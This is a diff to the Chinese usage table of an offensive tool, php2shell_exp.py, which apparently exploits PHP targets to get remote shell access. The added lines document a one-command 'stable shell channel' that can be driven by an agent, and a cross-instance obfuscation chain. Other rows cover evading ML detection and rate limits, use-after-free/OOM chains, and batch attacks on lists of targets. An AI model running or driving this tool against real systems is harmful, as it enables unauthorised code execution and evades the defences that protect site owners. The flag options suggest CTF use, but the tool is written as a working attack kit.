@@ -119,6 +119,7 @@ python php2shell_exp.py exploit https://TARGET/ --chain hijack \
 
 | 你要做什么 | 参数 |
 | --- | --- |
+| **稳定 shell 通道（首选）** | `shell URL`（一键自动建链）/ `echo CMD \| shell URL --json`（Agent） |
 | 全自动+留 flag | `auto URL --try-all --flag-cmd "..." --flag-expect "hello word"` |
 | 只识别防御 | `check URL` |
 | 全量策略轮打 | `--try-all` |
@@ -127,6 +128,7 @@ python php2shell_exp.py exploit https://TARGET/ --chain hijack \
 | 对抗 ML/频控 | `--jitter 8 --rounds 5 --sleep 60` |
 | 自定义命令 | `--cmd "COMMAND"` + `--expect "MARKER"` |
 | 精确端点 | `--seed-path P --trigger-path P` |
+| 跨实例混淆链 | `--seed-url http://S:PORT --trigger-url http://T:PORT` |
 | 扩 gadget | `--gadget-wordlist f.txt --prop-wordlist f.txt` |
 | uaf 链 | `--uaf-size-mb 12 --stall 1.5`（plant→解码 OOM→悬垂复用；只判 crash_signal） |
 | 批量 | `-f targets.txt --workers 8 -o report.jsonl` |
